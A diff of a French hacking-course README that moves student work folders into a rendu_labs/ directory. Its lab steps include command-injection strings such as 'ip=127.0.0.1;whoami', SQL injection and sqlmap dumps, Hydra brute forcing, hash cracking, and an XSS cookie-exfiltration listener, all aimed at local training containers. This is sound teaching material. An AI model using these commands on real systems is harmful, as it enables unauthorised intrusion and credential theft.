@@ -43,61 +43,58 @@ sudo usermod -aG docker $USER  # -aG = append to Group (préserve les groupes ex
 ## A.2 Arborescence de travail
 
 ```bash
-# Création du dossier racine du cours
-mkdir -p ~/cours-hacking
-cd ~/cours-hacking
-# git clone = télécharge une copie complète du dépôt Git distant dans le dossier 'repo'
-git clone https://github.com/yugmerabtene/techniques-de-hacking-niveau-1.git repo
+# git clone = télécharge une copie complète du dépôt Git distant dans le dossier courant
+git clone https://github.com/yugmerabtene/techniques-de-hacking-niveau-1.git
+cd techniques-de-hacking-niveau-1
 ```
 
 Une fois le dépôt cloné, voici l'arborescence **réelle** :
 
 ```text
-~/cours-hacking/
-└── repo/                              # Dépôt du cours (tout est ici)
-    ├── labs_resolution/               # 🔥 Labs RÉSOLUS (correction, référence)
-    │   ├── jour-01/labs/              #   Scripts XSS, SQLi, CMDi, hash cracking
-    │   ├── jour-02/labs/              #   Recon nmap, exploits vsftpd/Samba, MITM
-    │   ├── jour-03/labs/              #   BOF pwntools, WAF bypass, Trojan
-    │   ├── jour-04/labs/              #   Hardening + ELK SOC
-    │   └── jour-05/labs/              #   Forensique + generate_report.py
-    ├── env.sh                         # Variables centralisées (sourcer avant chaque lab)
-    ├── docker-compose.yml             # 7 conteneurs cibles
-    ├── docker/                        # Dockerfiles (buffovf, forensic, sqli-app, waf, secure-linux)
-    ├── img/                           # Schémas et figures
-    ├── JOUR-01*.md                    # Supports de cours
-    ├── JOUR-02*.md
-    ├── JOUR-03*.md
-    ├── JOUR-04*.md
-    ├── JOUR-05*.md
-    ├── HORS-SERIE-AGENTIC.md
-    ├── PLAN_SCHEMAS.md                # Plan des schémas à créer
-    ├── README.md                      # Ce fichier
-    └── extra/                         # Projets complémentaires
-        ├── HORS-SERIE-AGENTIC.md
-        └── hors-serie/                # Dockerfile + code source KillChainAgent
+techniques-de-hacking-niveau-1/      # Dépôt du cours (RACINE)
+├── labs_resolution/                 # 🔥 Labs RÉSOLUS (correction, référence)
+│   ├── jour-01/labs/                #   Scripts XSS, SQLi, CMDi, hash cracking
+│   ├── jour-02/labs/                #   Recon nmap, exploits vsftpd/Samba, MITM
+│   ├── jour-03/labs/                #   BOF pwntools, WAF bypass, Trojan
+│   ├── jour-04/labs/                #   Hardening + ELK SOC
+│   └── jour-05/labs/                #   Forensique + generate_report.py
+├── rendu_labs/                      # 📁 Votre dossier de rendu (à créer / compléter)
+│   ├── jour-01/                     #   → Déposez vos travaux J1 ici
+│   ├── jour-02/                     #   → Déposez vos travaux J2 ici
+│   ├── jour-03/                     #   → Déposez vos travaux J3 ici
+│   ├── jour-04/                     #   → Déposez vos travaux J4 ici
+│   └── jour-05/                     #   → Déposez vos travaux J5 ici
+├── env.sh                           # Variables centralisées (sourcer avant chaque lab)
+├── docker-compose.yml               # 7 conteneurs cibles
+├── docker/                          # Dockerfiles (buffovf, forensic, sqli-app, waf, secure-linux)
+├── img/                             # Schémas et figures
+├── JOUR-01*.md → JOUR-05*.md       # Supports de cours
+├── HORS-SERIE-AGENTIC.md
+├── PLAN_SCHEMAS.md
+├── README.md
+└── extra/                           # Projets complémentaires
+    └── hors-serie/                  # Dockerfile + code source KillChainAgent
 ```
 
-> **Note :** Vous créez votre dossier de travail `~/cours-hacking/labs/jour-0X/` vous-même au début de chaque lab (indiqué dans les prérequis). Consultez `repo/labs_resolution/jour-0X/labs/` si vous êtes bloqué.
+> **Note :** `rendu_labs/jour-0X/` est votre dossier de rendu — vous y placez vos scripts, captures, rapports. Consultez `labs_resolution/jour-0X/labs/` si vous êtes bloqué.
 
 ```mermaid
 flowchart LR
-    A["1. git clone repo"] --> B["2. cd repo && source env.sh"]
-    B --> C["3. docker compose up -d --build &lt;cible&gt;"]
-    C --> D["4. mkdir -p ~/cours-hacking/labs/jour-0X"]
-    D --> E["5. cd ~/cours-hacking/labs/jour-0X"]
+    A["1. git clone"] --> B["2. cd techniques-de-hacking-niveau-1"]
+    B --> C["3. source env.sh"]
+    C --> D["4. docker compose up -d --build &lt;cible&gt;"]
+    D --> E["5. cd rendu_labs/jour-0X"]
     E --> F["6. Travailler !"]
     F --> G{"Bloqué ?"}
-    G -->|"Oui"| H["cat repo/labs_resolution/jour-0X/labs/*.sh"]
+    G -->|"Oui"| H["cat labs_resolution/jour-0X/labs/*.sh"]
     G -->|"Non"| I["Passer au lab suivant"]
 ```
 
-**Fig 1b** — Workflow type d'un lab : cloner, sourcer, lancer le conteneur, créer son dossier de travail, exécuter le lab, consulter le corrigé si nécessaire.
+**Fig 1b** — Workflow type d'un lab : cloner, sourcer, lancer le conteneur, travailler dans `rendu_labs/`, consulter `labs_resolution/` en cas de blocage.
 
 ## A.3 Lancement des conteneurs
 
 ```bash
-cd ~/cours-hacking/repo
 # docker compose up = démarre tous les services définis dans docker-compose.yml
 # -d (detached) = arrière-plan, --build = reconstruit les images Docker avant de lancer
 # Sans argument : tous les conteneurs ; avec un nom : un seul service (ex: dvwa)
@@ -170,7 +167,7 @@ curl "http://localhost:8082/?cmd=id"
 # → uid=33(www-data)  (l'utilisateur serveur web est bien www-data, injection confirmée)
 
 # Validation automatique
-cd ~/cours-hacking/repo
+cd .
 ```
 
 ---
@@ -353,7 +350,7 @@ flowchart LR
 
 | Durée | Conteneur | Dossier | Outils |
 |---|---|---|---|
-| 30 min | dvwa (port 8088) | `~/cours-hacking/labs/jour-01/` | nmap, gobuster, curl |
+| 30 min | dvwa (port 8088) | `rendu_labs/jour-01/` | nmap, gobuster, curl |
 
 ### Contexte métier
 
@@ -362,7 +359,7 @@ Avant tout pentest, on scanne la cible pour cartographier sa surface d'attaque. 
 ### Étape 1 — Scan nmap
 
 ```bash
-mkdir -p ~/cours-hacking/labs/jour-01 && cd ~/cours-hacking/labs/jour-01
+mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
 # 📌 Scan nmap du port DVWA : détection de version du service web
 # 🔍 -sV = probe les bannières pour identifier la version précise du service
 # 🔍 -p 8088 = port cible, tee = affiche la sortie ET la sauvegarde dans un fichier
@@ -373,7 +370,7 @@ nmap -sV -p 8088 localhost | tee nmap_dvwa.txt
 ### Étape 2 — Énumération gobuster
 
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 # 📌 Énumération des répertoires web cachés avec gobuster
 # 🔍 dir = mode scan de répertoires, -u = URL cible, -w = wordlist de noms communs
 # 🔍 -q = mode silencieux (masque la bannière), | tee = affiche + sauvegarde
@@ -467,7 +464,7 @@ Dans DVWA → **XSS (Reflected)** → champ "What's your name?" :
 
 **Terminal 1** — écouteur HTTP :
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 # Lancement d'un serveur HTTP minimal sur le port 8000 (-m http.server) pour recevoir les cookies exfiltrés via XSS
 # Lancement d'un serveur HTTP minimal sur le port 8000 : -m = exécute le module Python http.server intégré
 # 8000 = port d'écoute arbitraire ; le serveur affiche chaque requête entrante (URL, IP source, User-Agent)
@@ -555,7 +552,7 @@ curl -s -b /tmp/dvwa_cookie.txt \
 ### Étape 2 — sqlmap : dumper les utilisateurs
 
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 
 # sqlmap : --load-cookies = charge les cookies depuis le fichier jar au format Netscape (PHPSESSID + security=low)
 # -u = URL cible, -D = base de données cible (dvwa), -T users = table cible
@@ -711,7 +708,7 @@ curl -s "http://localhost:8088/vulnerabilities/exec/" --data "ip=127.0.0.1;whoam
 
 | Durée | Conteneur | Dossier | Techniques |
 |---|---|---|---|
-| 1h | sqli-app (port 8083) | `~/cours-hacking/labs/jour-01/` | [T1190](https://attack.mitre.org/techniques/T1190/) + [T1110.001](https://attack.mitre.org/techniques/T1110/001/) |
+| 1h | sqli-app (port 8083) | `rendu_labs/jour-01/` | [T1190](https://attack.mitre.org/techniques/T1190/) + [T1110.001](https://attack.mitre.org/techniques/T1110/001/) |
 
 ### Contexte métier
 
@@ -733,11 +730,11 @@ L'application `sqli-app` (http://localhost:8083) expose 3 points d'injection dif
 
 ```bash
 # Démarre uniquement le conteneur sqli-app (sans reconstruire les autres) en mode détaché
-cd ~/cours-hacking/repo && docker compose up -d sqli-app
+docker compose up -d sqli-app
 # Vérification rapide que l'appli web répond (-I = HEAD, ne télécharge que les en-têtes HTTP)
 curl -I http://localhost:8083/
 # Création du dossier de labs jour-01 et déplacement dedans (&& garantit l'exécution séquentielle)
-mkdir -p ~/cours-hacking/labs/jour-01 && cd ~/cours-hacking/labs/jour-01
+mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
 ```
 
 ### Étape 1 — Trouver les injections manuellement
@@ -798,7 +795,7 @@ curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,user
 ### Étape 2 — Exploitation automatisée avec sqlmap
 
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 
 # sqlmap : --tables = énumère toutes les tables de la base, --batch = mode non-interactif (répond oui par défaut)
 # 2>&1 redirige stderr vers stdout pour tout capturer, tee sauvegarde la sortie ET l'affiche dans le terminal
@@ -863,7 +860,7 @@ Sortie attendue :
 #### Méthode 1 : john the ripper
 
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 
 # Création du fichier de hashs au format username:hash (une entrée par ligne)
 # cat > avec heredoc (<< 'EOF') écrit le contenu multiligne dans hashes.txt
@@ -917,7 +914,7 @@ flag_user:admin
 #### Méthode 3 : hashcat (si GPU disponible)
 
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 # hashcat : -m 0 = mode MD5 (hash type 0), -a 0 = attaque par dictionnaire (straight), --username = ignore la partie user: du fichier
 # --force = ignore les avertissements (pilote GPU manquant, matériel non optimal)
 hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
@@ -928,7 +925,7 @@ hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
 ### Étape 4 — Extraire le flag caché
 
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 
 # Extraction du flag caché dans la table products : -T products = table cible, -C name,secret_flag = colonnes à dumper
 # Le champ secret_flag contient le flag CTF à trouver (contient NULL pour les produits sans flag)
@@ -992,7 +989,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 
 | Durée | Conteneur | Dossier | Technique ATT&CK |
 |---|---|---|---|
-| 45 min | dvwa (port 8088) | `~/cours-hacking/labs/jour-01/` | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
+| 45 min | dvwa (port 8088) | `rendu_labs/jour-01/` | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
 
 ### Contexte métier
 
@@ -1015,7 +1012,7 @@ flowchart LR
 ### Prérequis
 
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 # Vérifier que le cookie jar DVWA est toujours valide
 curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost:8088/login.php"
 # → 200  (la session est active, on peut travailler)
@@ -1026,7 +1023,7 @@ curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost
 Avant de lancer Hydra, il faut comprendre la structure du formulaire : méthode HTTP, noms des champs, message d'échec.
 
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 
 # 📌 Récupérer le HTML de la page de login pour identifier les noms des champs
 # 🔍 curl -s = mode silencieux, -b = envoie le cookie de session
@@ -1046,7 +1043,7 @@ curl -s -b /tmp/dvwa_cookie.txt \
 ### Étape 2 — Lancer Hydra
 
 ```bash
-cd ~/cours-hacking/labs/jour-01
+cd rendu_labs/jour-01
 
 # 📌 Hydra teste le login admin contre la wordlist rockyou.txt
 # 🔍 -l admin = login unique (-l = single login, -L = fichier de logins)
@@ -1247,14 +1244,16 @@ flowchart TB
 
 ```
 techniques-de-hacking-niveau-1/
-├── labs/                  # VIDE — votre dossier de travail
-│   └── jour-0X/           # Créez vos scripts ici
-├── labs_resolution/       # CORRIGÉS — solutions complètes
-│   └── jour-0X/labs/      # Scripts, scans, exploits résolus
-├── JOUR-0X-*.md           # Supports de cours (5 jours)
+├── rendu_labs/            # 📁 Votre dossier de rendu
+│   └── jour-0X/           #   Déposez vos travaux ici
+├── labs_resolution/       # 🔥 CORRIGÉS — solutions complètes
+│   └── jour-0X/labs/      #   Scripts, scans, exploits résolus
 ├── env.sh                 # Variables d'environnement (sourcer avant les labs)
 ├── docker-compose.yml     # Orchestration des 7 conteneurs
-└── docker/                # Dockerfiles de chaque conteneur
+├── docker/                # Dockerfiles de chaque conteneur
+├── img/                   # Schémas et figures
+├── JOUR-0X-*.md           # Supports de cours (5 jours)
+└── extra/                 # Projets complémentaires
 ```
 
 ### Correspondance lab → technique ATT&CK
@@ -1299,24 +1298,24 @@ techniques-de-hacking-niveau-1/
 
 ```bash
 # Les scripts résolus se trouvent dans labs_resolution/
-ls ~/cours-hacking/repo/labs_resolution/jour-01/labs/
+ls labs_resolution/jour-01/labs/
 # Exemple : copier le corrigé du lab XSS dans votre dossier de travail
-cp ~/cours-hacking/repo/labs_resolution/jour-01/labs/lab_xss.sh ~/cours-hacking/labs/jour-01/
+cp labs_resolution/jour-01/labs/lab_xss.sh rendu_labs/jour-01/
 ```
 
 ### Avant chaque lab
 
 ```bash
-# 0. Créer votre dossier de travail pour ce jour (une seule fois)
-mkdir -p ~/cours-hacking/labs/jour-0X
+# 0. Créer votre dossier de rendu pour ce jour (une seule fois)
+mkdir -p rendu_labs/jour-0X
 # 1. Charger les variables d'environnement
-cd ~/cours-hacking/repo && source env.sh
+cd /chemin/vers/techniques-de-hacking-niveau-1 && source env.sh
 # 2. Démarrer les conteneurs nécessaires
 docker compose up -d --build <conteneur>
 # 3. Vérifier que le service répond
 nc -z localhost <PORT> && echo "Prêt"
-# 4. Travailler dans votre dossier
-cd ~/cours-hacking/labs/jour-0X
+# 4. Travailler dans votre dossier de rendu
+cd rendu_labs/jour-0X
 ```
 
 ---
